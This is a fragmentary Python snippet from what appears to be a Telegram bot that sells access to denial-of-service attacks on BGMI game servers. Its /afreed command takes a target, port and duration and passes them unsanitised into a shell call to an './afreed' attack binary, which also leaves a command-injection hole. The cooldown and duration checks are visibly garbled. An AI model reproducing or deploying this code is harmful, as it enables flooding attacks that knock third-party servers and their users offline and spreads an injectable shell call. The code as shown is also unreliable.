...
# Function to handle the reply when free users run the /afreed command
...
# Dictionary to store the last time each user ran the /afreed command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /afreed command
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /afreed Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 1000:
                ...
                record_command_logs(user_id, '/afreed', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./afreed {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /afreed <target> <port> <time>"  # Updated command syntax
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /afreed command.                                                                          DM TO BUY ACCESS:- @kingthenos_bhai")
...
💥 /afreed : Method For Bgmi Servers. 
